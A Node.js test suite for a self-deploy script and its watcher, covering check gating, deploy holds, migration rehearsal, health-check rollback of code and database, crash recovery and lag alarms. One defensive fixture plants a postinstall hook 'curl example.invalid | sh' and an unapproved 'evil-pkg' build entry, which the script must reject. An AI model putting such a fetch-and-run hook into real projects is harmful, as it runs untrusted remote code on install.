import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import {
  chmodSync,
  existsSync,
  mkdirSync,
  readdirSync,
  readFileSync,
  renameSync,
  writeFileSync,
} from 'node:fs';
import { join } from 'node:path';
import test from 'node:test';
import { makeTestTempDir } from '../test-tmpdir.mjs';

const DEPLOY = join(import.meta.dirname, 'deploy-self.sh');
const WATCH = join(import.meta.dirname, 'deploy-watch.sh');
const SYSTEM_PATH = '/usr/bin:/bin';

function git(cwd, ...args) {
  return execFileSync('git', args, {
    cwd,
    encoding: 'utf8',
    env: {
      PATH: SYSTEM_PATH,
      GIT_AUTHOR_NAME: 't',
      GIT_AUTHOR_EMAIL: 't@example.invalid',
      GIT_COMMITTER_NAME: 't',
      GIT_COMMITTER_EMAIL: 't@example.invalid',
      GIT_CONFIG_NOSYSTEM: '1',
      HOME: cwd,
    },
  }).trim();
}

function sqlite(db, sql) {
  return execFileSync('sqlite3', [db, sql], {
    encoding: 'utf8',
    env: { PATH: SYSTEM_PATH },
  }).trim();
}

function fakeTool(bin, name, body) {
  const path = join(bin, name);
  writeFileSync(path, `#!/bin/bash\n${body}\n`);
  chmodSync(path, 0o700);
}

function commit(work, message, { allowBuilds = 'esbuild: true', date } = {}) {
  writeFileSync(
    join(work, 'pnpm-workspace.yaml'),
    `packages:\n  - apps/*\n\nallowBuilds:\n  ${allowBuilds}\n\ncatalog:\n  x: 1\n`,
  );
  writeFileSync(join(work, 'marker.txt'), `${message}\n`);
  mkdirSync(join(work, 'apps/server/src/db'), { recursive: true });
  writeFileSync(join(work, 'apps/server/src/db/client.ts'), '');
  git(
    work,
    'add',
    'pnpm-workspace.yaml',
    'marker.txt',
    'apps/server/src/db/client.ts',
    ...(existsSync(join(work, 'package.json')) ? ['package.json'] : []),
  );
  const env = date ? ['-c', `user.name=t`] : [];
  execFileSync('git', [...env, 'commit', '-q', '-m', message], {
    cwd: work,
    env: {
      PATH: SYSTEM_PATH,
      HOME: work,
      GIT_CONFIG_NOSYSTEM: '1',
      GIT_AUTHOR_NAME: 't',
      GIT_AUTHOR_EMAIL: 't@example.invalid',
      GIT_COMMITTER_NAME: 't',
      GIT_COMMITTER_EMAIL: 't@example.invalid',
      ...(date ? { GIT_COMMITTER_DATE: date, GIT_AUTHOR_DATE: date } : {}),
    },
  });
  return git(work, 'rev-parse', 'HEAD');
}

function fixture({ claimed = 0 } = {}) {
  const dir = makeTestTempDir('deploy-self-');
  const origin = join(dir, 'origin.git');
  const work = join(dir, 'work');
  const checkout = join(dir, 'checkout');
  const data = join(dir, 'data');
  const state = join(dir, 'state');
  const backups = join(dir, 'backups');
  const fake = join(dir, 'fake');
  const bin = join(dir, 'bin');
  for (const path of [work, data, fake, bin]) mkdirSync(path, { recursive: true });
  git(dir, 'init', '-q', '--bare', '-b', 'main', origin);
  git(work, 'init', '-q', '-b', 'main');
  const previous = commit(work, 'previous');
  git(work, 'remote', 'add', 'origin', origin);
  git(work, 'push', '-q', 'origin', 'main');
  git(dir, 'clone', '-q', origin, checkout);
  git(checkout, 'checkout', '-q', '--detach', previous);

  const db = join(data, 'server.db');
  sqlite(
    db,
    `create table step(id text primary key, status text);
     create table machine(id text primary key, name text, lastSeenAt integer, maxConcurrent integer default 1);
     create table __drizzle_migrations(id integer primary key, hash text);
     insert into machine values ('m1', 'omarchy', 0, 1);
     insert into __drizzle_migrations(hash) values ('m0');`,
  );
  for (let i = 0; i < claimed; i++) sqlite(db, `insert into step values ('s${i}', 'claimed')`);

  fakeTool(
    bin,
    'gh',
    `echo "gh $*" >> "${fake}/gh.log"
case "$1 $2" in
  "api repos/"*)
    sha=$(echo "$2" | sed -E 's#.*/commits/([0-9a-f]+)/check-runs.*#\\1#')
    if [ -f "${fake}/checks-$sha" ]; then cat "${fake}/checks-$sha"; else printf 'check\\tsuccess\\npack-smoke\\tsuccess\\ne2e-gate\\tsuccess\\n'; fi ;;
  "issue list")
    if [[ "$*" == *autonomy-paused* ]]; then cat "${fake}/paused" 2>/dev/null || echo 0
    else cat "${fake}/lag-issue" 2>/dev/null || true; fi ;;
  "issue create") echo "https://github.com/x/y/issues/77" ;;
esac`,
  );
  fakeTool(
    bin,
    'pnpm',
    `echo "pnpm $* @ $(git -C "${checkout}" rev-parse HEAD 2>/dev/null)" >> "${fake}/pnpm.log"; [ -f "${fake}/pnpm-fail" ] && [[ "$*" == *web* ]] && exit 1; exit 0`,
  );
  fakeTool(
    bin,
    'node',
    `echo "node $*" >> "${fake}/node.log"
[ -f "${fake}/migrate-fail" ] && exit 1
db="\${@: -1}"
sqlite3 "$db" "insert into __drizzle_migrations(hash) values ('m1')"`,
  );
  fakeTool(
    bin,
    'systemctl',
    `if [ "$2" = is-enabled ]; then [ -f "${fake}/orb-enabled" ]; exit $?; fi
echo "systemctl $*" >> "${fake}/systemctl.log"
[ ! -f "${fake}/phase-on-start" ] || [ "$2" != start ] || echo "start $3 @ $(sed -n 's/^phase=//p' "${dir}/state/in-progress" 2>/dev/null)" >> "${fake}/phases.log"
if [ "$2 $3" = "start cairn-server.service" ]; then
  head=$(git -C "${checkout}" rev-parse HEAD)
  [ "$head" = "${previous}" ] || sqlite3 "${db}" "insert or ignore into __drizzle_migrations(id, hash) values (2, 'm1')"
  if [ "$head" = "${previous}" ] && [ -f "${fake}/broken-previous" ]; then
    rm -f "${fake}/up"
  elif [ "$head" = "$(cat "${fake}/broken-sha" 2>/dev/null)" ]; then
    rm -f "${fake}/up"
    sqlite3 "${db}" "update machine set lastSeenAt = lastSeenAt + 1"
    [ ! -f "${fake}/machine-write-on-broken-start" ] || sqlite3 "${db}" "update machine set maxConcurrent = 4"
    [ ! -f "${fake}/write-on-broken-start" ] || sqlite3 "${db}" "insert or ignore into step values ('written-after', 'done')"
    [ ! -f "${fake}/column-on-broken-start" ] || sqlite3 "${db}" "alter table step add column note text; alter table step add column tier text default 'low'"
    [ ! -s "${fake}/column-on-broken-start" ] || sqlite3 "${db}" "update step set note = '$(cat "${fake}/column-on-broken-start")'"
  else touch "${fake}/up"; fi
fi
[ "$2 $3" = "stop cairn-server.service" ] && rm -f "${fake}/up"
if [ "$2 $3" = "start cairn-daemon.service" ]; then
  sqlite3 "${db}" "update machine set lastSeenAt = (cast(strftime('%s','now') as integer) + 5) * 1000"
fi
exit 0`,
  );
  fakeTool(
    bin,
    'curl',
    `url="\${@: -1}"
if [ -f "${fake}/up" ]; then
  case "$url" in */app) printf 200 ;; */api/user/me) printf 401 ;; *) printf 404 ;; esac
else printf 000; fi`,
  );
  fakeTool(bin, 'hostname', 'echo omarchy');

  const env = {
    PATH: `${bin}:${SYSTEM_PATH}`,
    HOME: dir,
    GIT_CONFIG_NOSYSTEM: '1',
    CAIRN_CHECKOUT: checkout,
    CAIRN_DATA_DIR: data,
    CAIRN_DEPLOY_STATE: state,
    CAIRN_DEPLOY_BACKUPS: backups,
    CAIRN_DEPLOY_SCRATCH: join(dir, 'scratch'),
    CAIRN_REPO: 'xiechimon/cairn',
    CAIRN_HEALTH_URL: 'http://127.0.0.1:8787',
    CAIRN_HEALTH_TRIES: '3',
    CAIRN_HEALTH_INTERVAL: '0',
  };
  const run = (script, args, extra = {}) =>
    spawnSync('/bin/bash', [script, ...args], { encoding: 'utf8', env: { ...env, ...extra } });
  const log = (name) =>
    existsSync(join(fake, name)) ? readFileSync(join(fake, name), 'utf8') : '';
  return { dir, work, checkout, data, db, state, backups, fake, previous, run, log };
}

function pushTarget(f, message = 'target', options) {
  const sha = commit(f.work, message, options);
  git(f.work, 'push', '-q', 'origin', 'main');
  return sha;
}

test('refuses a malformed SHA and a SHA that is not on main', () => {
  const f = fixture();
  assert.equal(f.run(DEPLOY, ['abc']).status, 2);
  git(f.work, 'checkout', '-q', '-b', 'side');
  const side = commit(f.work, 'side');
  git(f.work, 'push', '-q', 'origin', 'side');
  const result = f.run(DEPLOY, [side]);
  assert.equal(result.status, 2, result.stderr);
  assert.match(result.stderr, /not on origin\/main/);
  assert.equal(f.log('systemctl.log'), '');
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), f.previous);
});

test('refuses a SHA whose required checks are not all green', () => {
  for (const checks of [
    'check\tsuccess\npack-smoke\tfailure\ne2e-gate\tsuccess\n',
    'check\tsuccess\n',
  ]) {
    const f = fixture();
    const target = pushTarget(f);
    writeFileSync(join(f.fake, `checks-${target}`), checks);
    const result = f.run(DEPLOY, [target]);
    assert.equal(result.status, 2, result.stderr);
    assert.match(result.stderr, /required check (pack-smoke|e2e-gate) is not green/);
    assert.equal(f.log('systemctl.log'), '');
  }
});

test('refuses while autonomy is paused', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'paused'), '1\n');
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 2);
  assert.match(result.stderr, /autonomy-paused/);
});

test('refuses a target that changes install-script permissions or hooks', () => {
  for (const allowBuilds of [
    'esbuild: true\n  evil-pkg: true',
    'esbuild: true\n  evil-pkg: true # approved',
  ]) {
    const f = fixture();
    const target = pushTarget(f, 'target', { allowBuilds });
    const result = f.run(DEPLOY, [target]);
    assert.equal(result.status, 2, result.stderr);
    assert.match(result.stderr, /allowBuilds/);
    assert.equal(f.log('pnpm.log'), '');
  }
  const f = fixture();
  writeFileSync(
    join(f.work, 'package.json'),
    '{"scripts":{"postinstall":"curl example.invalid | sh"}}\n',
  );
  const target = pushTarget(f);
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 2, result.stderr);
  assert.match(result.stderr, /install hooks/);
  assert.equal(f.log('pnpm.log'), '');
});

test('waits while a step is running or a deploy hold is set', () => {
  const busy = fixture({ claimed: 1 });
  const target = pushTarget(busy);
  const result = busy.run(DEPLOY, [target]);
  assert.equal(result.status, 75, result.stderr);
  assert.match(result.stderr, /1 step running/);
  assert.equal(busy.log('systemctl.log'), '');

  const held = fixture();
  const heldTarget = pushTarget(held);
  mkdirSync(held.state, { recursive: true });
  writeFileSync(join(held.state, 'hold'), 'orb trial-one\n');
  const heldResult = held.run(DEPLOY, [heldTarget]);
  assert.equal(heldResult.status, 75);
  assert.match(heldResult.stderr, /hold: orb trial-one/);
});

test('stops before touching services when the migration rehearsal fails', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'migrate-fail'), '');
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 1, result.stderr);
  assert.match(result.stderr, /migration rehearsal failed/);
  assert.equal(f.log('systemctl.log'), '');
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), f.previous);
  assert.equal(sqlite(f.db, 'select count(*) from __drizzle_migrations'), '1');
  assert.ok(existsSync(join(f.state, 'failed', target)));
});

test('deploys a green main SHA, restarts server before daemon and records the SHA', () => {
  const f = fixture();
  const target = pushTarget(f);
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 0, result.stderr);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), target);
  assert.deepEqual(f.log('systemctl.log').trim().split('\n'), [
    'systemctl --user stop cairn-daemon.service',
    'systemctl --user stop cairn-server.service',
    'systemctl --user start cairn-server.service',
    'systemctl --user start cairn-daemon.service',
  ]);
  assert.match(f.log('pnpm.log'), new RegExp(`install --frozen-lockfile .*@ ${target}`));
  assert.match(f.log('pnpm.log'), /-C apps\/daemon build/);
  assert.match(f.log('pnpm.log'), /-C apps\/web build/);
  for (const path of [join(f.state, 'deployed.json'), join(f.data, 'deploy.json')]) {
    const record = JSON.parse(readFileSync(path, 'utf8'));
    assert.equal(record.sha, target);
    assert.equal(record.previous, f.previous);
    assert.equal(record.result, 'deployed');
  }
  const snapshots = readdirSync(f.backups).filter((name) => name.startsWith('stopped-'));
  assert.equal(snapshots.length, 1);

  const again = f.run(DEPLOY, [target]);
  assert.equal(again.status, 0);
  assert.match(again.stdout, /already deployed/);
});

test('rolls code and database back when the new server fails its health check', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'broken-sha'), target);
  sqlite(f.db, "insert into step values ('done-before', 'done')");
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 1, result.stderr);
  assert.match(result.stderr, /health check failed/);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), f.previous);
  assert.equal(sqlite(f.db, "select count(*) from step where id = 'done-before'"), '1');
  assert.equal(sqlite(f.db, 'select count(*) from __drizzle_migrations'), '1');
  const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
  assert.equal(record.sha, f.previous);
  assert.equal(record.result, 'rolled-back');
  assert.equal(record.failed, target);
  assert.ok(existsSync(join(f.state, 'failed', target)));
  assert.match(f.log('pnpm.log'), new RegExp(`install --frozen-lockfile .*@ ${f.previous}`));
  assert.ok(readdirSync(f.backups).some((name) => name.startsWith('failed-')));
});

test('keeps the DB and rolls back only code when data changed after the snapshot', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'broken-sha'), target);
  writeFileSync(join(f.fake, 'write-on-broken-start'), '');
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 1, result.stderr);
  assert.match(result.stderr, /kept the DB/);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), f.previous);
  assert.equal(sqlite(f.db, "select count(*) from step where id = 'written-after'"), '1');
  assert.equal(sqlite(f.db, 'select count(*) from __drizzle_migrations'), '2');
  const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
  assert.equal(record.result, 'rolled-back-code');
  assert.ok(!readdirSync(f.backups).some((name) => name.startsWith('failed-')));
});

test('treats values in a column added after the snapshot as writes, but not its default', () => {
  for (const [note, expected] of [
    ['written', 'rolled-back-code'],
    ['', 'rolled-back'],
  ]) {
    const f = fixture();
    sqlite(f.db, "insert into step values ('done-before', 'done')");
    const target = pushTarget(f);
    writeFileSync(join(f.fake, 'broken-sha'), target);
    writeFileSync(join(f.fake, 'column-on-broken-start'), note);
    const result = f.run(DEPLOY, [target]);
    assert.equal(result.status, 1, result.stderr);
    const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
    assert.equal(record.result, expected, result.stderr);
  }
});

test('counts a persistent machine field as a write but not a heartbeat', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'broken-sha'), target);
  writeFileSync(join(f.fake, 'machine-write-on-broken-start'), '');
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 1, result.stderr);
  const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
  assert.equal(record.result, 'rolled-back-code');
  assert.equal(sqlite(f.db, 'select maxConcurrent from machine'), '4');
});

test('keeps the written DB and reports critical when the previous build is unhealthy too', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'broken-sha'), target);
  writeFileSync(join(f.fake, 'broken-previous'), '');
  writeFileSync(join(f.fake, 'write-on-broken-start'), '');
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 3, result.stderr);
  assert.match(result.stderr, /CRITICAL: .* kept that DB/);
  assert.equal(sqlite(f.db, "select count(*) from step where id = 'written-after'"), '1');
  assert.ok(!readdirSync(f.backups).some((name) => name.startsWith('failed-')));
  assert.ok(!existsSync(join(f.state, 'in-progress')));
});

test('recovers an interrupted switch: finishes a healthy target, rolls back an unhealthy one', () => {
  for (const broken of [false, true]) {
    const f = fixture();
    const target = pushTarget(f);
    git(f.checkout, 'fetch', '-q', 'origin', 'main');
    git(f.checkout, 'checkout', '-q', '--detach', target);
    mkdirSync(f.state, { recursive: true });
    mkdirSync(f.backups, { recursive: true });
    const snapshot = join(f.backups, 'stopped-interrupted.db');
    sqlite(f.db, `vacuum into '${snapshot}'`);
    writeFileSync(
      join(f.state, 'in-progress'),
      `phase=switching\ntarget=${target}\nprevious=${f.previous}\nsnapshot=${snapshot}\n`,
    );
    if (broken) writeFileSync(join(f.fake, 'broken-sha'), target);
    const result = f.run(DEPLOY, ['--recover']);
    assert.equal(result.status, broken ? 1 : 0, result.stderr);
    const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
    assert.equal(record.result, broken ? 'rolled-back' : 'deployed');
    assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), broken ? f.previous : target);
    assert.ok(!existsSync(join(f.state, 'in-progress')));
  }
});

test('recovers a rollback killed while swapping the DB, before any service starts', () => {
  for (const point of ['before-move', 'after-move', 'mid-copy']) {
    const f = fixture();
    sqlite(f.db, "insert into step values ('in-snapshot', 'done')");
    const target = pushTarget(f);
    git(f.checkout, 'fetch', '-q', 'origin', 'main');
    git(f.checkout, 'checkout', '-q', '--detach', target);
    mkdirSync(f.state, { recursive: true });
    mkdirSync(f.backups, { recursive: true });
    const snapshot = join(f.backups, 'stopped-interrupted.db');
    sqlite(f.db, `vacuum into '${snapshot}'`);
    sqlite(f.db, "insert into step values ('failed-only', 'done')");
    const failedDir = join(f.backups, 'failed-interrupted');
    mkdirSync(failedDir);
    if (point !== 'before-move') renameSync(f.db, join(failedDir, 'server.db'));
    if (point === 'mid-copy') writeFileSync(`${f.db}.restoring`, 'partial');
    writeFileSync(
      join(f.state, 'in-progress'),
      `phase=restoring\ntarget=${target}\nprevious=${f.previous}\nsnapshot=${snapshot}\nfailed=${failedDir}\n`,
    );
    const result = f.run(DEPLOY, ['--recover']);
    assert.equal(result.status, 1, `${point}: ${result.stderr}`);
    assert.equal(sqlite(f.db, "select count(*) from step where id = 'in-snapshot'"), '1');
    assert.equal(sqlite(f.db, "select count(*) from step where id = 'failed-only'"), '0');
    assert.ok(
      readdirSync(failedDir).some((name) => name.startsWith('server.db')),
      point,
    );
    assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), f.previous);
    const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
    assert.equal(record.result, 'rolled-back');
    assert.ok(!existsSync(join(f.state, 'in-progress')));
    const starts = f
      .log('systemctl.log')
      .split('\n')
      .filter((line) => line.includes('start'));
    assert.deepEqual(starts, [
      'systemctl --user start cairn-server.service',
      'systemctl --user start cairn-daemon.service',
    ]);
  }
});

test('recovery after the snapshot was restored and services started keeps their new writes', () => {
  for (const checkoutAt of ['previous', 'target']) {
    const f = fixture();
    const target = pushTarget(f);
    git(f.checkout, 'fetch', '-q', 'origin', 'main');
    if (checkoutAt === 'target') git(f.checkout, 'checkout', '-q', '--detach', target);
    mkdirSync(f.state, { recursive: true });
    mkdirSync(f.backups, { recursive: true });
    const snapshot = join(f.backups, 'stopped-interrupted.db');
    sqlite(f.db, `vacuum into '${snapshot}'`);
    sqlite(f.db, "insert into step values ('written-by-restarted-previous', 'done')");
    const failedDir = join(f.backups, 'failed-interrupted');
    mkdirSync(failedDir);
    writeFileSync(
      join(f.state, 'in-progress'),
      `phase=restored\ntarget=${target}\nprevious=${f.previous}\nsnapshot=${snapshot}\nfailed=${failedDir}\n`,
    );
    const result = f.run(DEPLOY, ['--recover']);
    assert.equal(result.status, 1, `${checkoutAt}: ${result.stderr}`);
    assert.equal(
      sqlite(f.db, "select count(*) from step where id = 'written-by-restarted-previous'"),
      '1',
    );
    assert.deepEqual(readdirSync(failedDir), []);
    assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), f.previous);
    const record = JSON.parse(readFileSync(join(f.state, 'deployed.json'), 'utf8'));
    assert.equal(record.result, 'rolled-back');
    assert.ok(!existsSync(join(f.state, 'in-progress')));
  }
});

test('a rollback persists the restored phase before starting the previous build', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'broken-sha'), target);
  writeFileSync(join(f.fake, 'phase-on-start'), '');
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 1, result.stderr);
  assert.deepEqual(f.log('phases.log').trim().split('\n'), [
    'start cairn-server.service @ switching',
    'start cairn-server.service @ restored',
    'start cairn-daemon.service @ restored',
  ]);
});

test('does not treat a checkout at the target as deployed without a record and a healthy server', () => {
  const f = fixture();
  const target = pushTarget(f);
  git(f.checkout, 'fetch', '-q', 'origin', 'main');
  git(f.checkout, 'checkout', '-q', '--detach', target);
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 1, result.stderr);
  assert.match(result.stderr, /without a deploy record/);
});

test('watch deploys the newest green main commit and skips a SHA that already failed', () => {
  const f = fixture();
  const green = pushTarget(f, 'green');
  const red = pushTarget(f, 'red');
  writeFileSync(
    join(f.fake, `checks-${red}`),
    'check\tfailure\npack-smoke\tsuccess\ne2e-gate\tsuccess\n',
  );
  const result = f.run(WATCH, [], { CAIRN_DEPLOY_SCRIPT: DEPLOY });
  assert.equal(result.status, 0, result.stderr);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), green);

  const next = pushTarget(f, 'next');
  mkdirSync(join(f.state, 'failed'), { recursive: true });
  writeFileSync(join(f.state, 'failed', next), 'health check failed\n');
  const skipped = f.run(WATCH, [], { CAIRN_DEPLOY_SCRIPT: DEPLOY });
  assert.equal(skipped.status, 0, skipped.stderr);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), green);
  assert.match(skipped.stderr, /already failed/);
});

test('watch raises one lag alarm per main head after two hours and closes it once caught up', () => {
  const f = fixture();
  const old = new Date(Date.now() - 3 * 3600 * 1000).toISOString();
  const stale = pushTarget(f, 'stale', { date: old });
  writeFileSync(join(f.fake, `checks-${stale}`), 'check\tfailure\n');
  const env = { CAIRN_DEPLOY_SCRIPT: DEPLOY };
  assert.equal(f.run(WATCH, [], env).status, 0);
  assert.match(f.log('gh.log'), /gh issue create .*deploy lag/);
  assert.equal(f.run(WATCH, [], env).status, 0);
  assert.equal(f.log('gh.log').match(/gh issue (create|comment)/g).length, 1);

  writeFileSync(join(f.fake, 'lag-issue'), '77\n');
  const fixed = pushTarget(f, 'fixed');
  assert.equal(f.run(WATCH, [], env).status, 0);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), fixed);
  assert.match(f.log('gh.log'), /gh issue close 77/);
});

test('watch stays quiet when the undeployed commit is younger than the limit', () => {
  const f = fixture();
  const fresh = pushTarget(f, 'fresh');
  writeFileSync(join(f.fake, `checks-${fresh}`), 'check\tfailure\n');
  assert.equal(f.run(WATCH, [], { CAIRN_DEPLOY_SCRIPT: DEPLOY }).status, 0);
  assert.doesNotMatch(f.log('gh.log'), /issue (create|comment)/);
});

for (const broken of [false, true]) {
  test(`restarts the enabled Orb daemon during deploy and rollback: ${broken}`, () => {
    const f = fixture();
    const target = pushTarget(f);
    writeFileSync(join(f.fake, 'orb-enabled'), '');
    if (broken) writeFileSync(join(f.fake, 'broken-sha'), target);
    const result = f.run(DEPLOY, [target]);
    assert.equal(result.status, broken ? 1 : 0, result.stderr);
    const calls = f.log('systemctl.log').trim().split('\n');
    assert.ok(calls.includes('systemctl --user stop cairn-daemon-orb.service'));
    assert.ok(calls.includes('systemctl --user start cairn-daemon-orb.service'));
    assert.ok(
      calls.indexOf('systemctl --user start cairn-daemon-orb.service') >
        calls.indexOf('systemctl --user start cairn-server.service'),
    );
  });
}
